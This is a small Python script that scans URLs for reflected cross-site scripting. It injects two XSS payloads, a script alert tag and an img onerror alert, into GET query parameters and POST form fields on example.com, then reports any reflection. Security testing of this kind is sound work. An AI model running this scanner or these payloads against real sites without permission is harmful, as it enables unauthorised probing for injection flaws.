import requests
from bs4 import BeautifulSoup
from urllib.parse import urlparse

# Test strings containing different characters, tags, and scripts
test_strings = [
    "<script>alert('XSS');</script>",
    "<img src='nonexistent.jpg' onerror=alert('XSS')>",
]

def check_get_vulnerability(url):
    """Function to make a GET request and check vulnerability in URL parameters"""
    parsed_url = urlparse(url)
    base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
    
    for parameter_name in parsed_url.query.split("&"):
        name, value = parameter_name.split("=")

        for test_string in test_strings:
            malicious_url = f"{base_url}?{name}={value}{test_string}"

            response = requests.get(malicious_url)
        
            if test_string in str(response.content):
                print(f"GET-based XSS found: {malicious_url}")

def check_post_vulnerability(url, data):
    """Function to make a POST request and check vulnerability in form fields"""
    for field, initial_value in data.items():
        for test_string in test_strings:
            modified_data = {field: f"{initial_value}{test_string}"}
            
            response = requests.post(url, data=modified_data)
            
            if test_string in str(response.content):
                print(f"POST-based XSS found: {url}, field '{field}'")

# Usage Examples:

# Check GET-based vulnerability
check_get_vulnerability("https://example.com/?param1=value1&param2=value2")

# Define form data for POST-based vulnerability check
form_data = {
    "username": "test_user",
    "password": "123456"
}

# Check POST-based vulnerability
check_post_vulnerability("https://example.com/login.php", form_data)